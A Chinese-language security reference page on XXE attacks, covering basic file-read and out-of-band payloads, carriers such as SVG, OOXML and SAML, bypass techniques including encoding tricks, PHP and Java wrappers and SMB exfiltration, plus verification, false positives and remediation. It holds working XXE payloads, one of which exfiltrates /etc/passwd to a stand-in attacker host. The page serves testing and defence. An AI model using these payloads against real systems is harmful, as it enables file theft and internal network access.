# XXE（XML 外部实体）与现代绕过

> XXE 的现代难点不是"能不能解析实体"，而是**目标禁用了实体/网络/DTD 之后怎么继续**。2025 年的研究给出了绕过"非网络 + 双解析 + doctype 检查"的组合拳。

## 一、基础类型

```xml
<!-- 文件读取 -->
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>

<!-- 带外（OOB） -->
<!DOCTYPE r [<!ENTITY % f SYSTEM "file:///etc/passwd">
            <!ENTITY % d "<!ENTITY exfil SYSTEM 'http://attacker/?d=%f;'>"> %d;]>
```

- 盲 XXE：通过**参数实体**把文件内容塞进 URL。
- 错误型 OOB：利用解析错误消息把内容带出（当带外被禁）。
- 无回显但有 SSRF：直接打内网/元数据（见 `../SSRF/Cloud-Metadata-Access.md`）。

## 二、载体（不只有 XML 接口）

| 载体 | 说明 |
|---|---|
| SOAP / XML-RPC | 最常见 |
| SVG 上传/渲染 | `<image>`、外部 DTD |
| DOCX/XLSX/PPTX | OOXML 内部 XML + 外部关系（可 RCE/SSRF） |
| PDF 生成 | 外部 XObject、`/URI` |
| RSS/Atom、SAML、WSDL | 解析器自动跟随 |
| 配置导入 | 导入 XML 配置即触发 |
| JS 库 | 老版本 `libxmljs`、`xml2js` 宽松配置 |

## 三、绕过手法

### 1. 编码与包装器

- UTF-16/UTF-7 编码的 DTD 绕过基于文本的检测。
- `data://`、`php://filter`、`expect://`、`jar://`、`netdoc://`（Java）。
- DTD 外链到自控服务器，把内网探测放在 DTD 的 SYSTEM 中（`parameter entity` 间接）。

### 2. 绕过"仅允许 http/https"

- 通过外链 DTD 中的 `SYSTEM` 使用 `file://`：因为限制通常只作用于**主文档**。
- 大小写与协议变体：`File://`、`file:/`、`file://localhost/`。

### 3. Java / PHP 特殊路径

- Java：`netdoc://`、`jar://`、`http://` 到内网；本地 DTD 文件复用（Modern XXE with Local DTD）。
- PHP：`php://filter/convert.base64-encode` 读 PHP 源码；配合 `expect://`（若启用）。
- 2025 "Impossible XXE in PHP"：利用 **libxml2 参数实体扩展怪癖 + PHP 流包装器 + filter chain**，绕过 `LIBXML_NONET`、双重解析、doctype 检查；把压缩 DTD 以 `data:` 内联，并**通过 DNS 带出文件**。
- 2025 "Make XXE Brilliant Again"：JDK 的 FTP/HTTP 带外通道会清洗换行导致数据截断 → 改用 **Windows UNC 路径（`\\attacker\share`）经 SMB 带出多行数据**。

### 4. 其他

- 实体扩展数量限制绕过（Billion Laughs 的变体与配额探测）。
- 通过 `<!ENTITY % a "..." >` 嵌套避免关键字出现。
- 在 DTD 内使用 `%` 与字符串拼接隐藏关键字。

## 四、验证（最小证据）

1. 受控输入被 XML 解析（附请求体）。
2. 证据三选一：带外命中（DNS/HTTP/SMB 带唯一标识）、回显的本地文件内容片段、明确的可复现解析差异/错误信息。
3. 若为文件读取：给出文件路径与内容片段（敏感文件需掩码）。
4. 若为 SSRF：按 `../SSRF/README.md` 的要求给出内部访问证据。

## 五、常见误报

- 解析器报"实体未定义"→ 说明实体被禁用。
- 用带外域名收到 DNS 但来自"XML 校验工具的预览"而非目标（核对来源 IP）。
- 返回了 XML 结构但未解析实体（如直接把 DTD 当作文本）。
- 上传 DOCX 后未被任何服务端组件解析。

## 六、修复

- 禁用 DTD 与外部实体（`disallow-doctype-decl`、`XMLConstants.FEATURE_SECURE_PROCESSING`、Java `ACCESS_EXTERNAL_DTD/SCHEMA=""`）。
- 使用不支持实体的解析器（如配置严格的 SAX/StAX，或换用 JSON）。
- 禁止服务端解析用户上传的 XML/文档；必须解析时放入沙箱（无网络、无凭据）。
- 禁止 `expect`/`phar` 等危险包装器。

## 参考

- PortSwigger XXE、PayloadsAllTheThings XXE Injection
- PT Security：Impossible XXE in PHP（2025）
- Make XXE Attacks Brilliant Again：UNC/SMB 带外（2025）
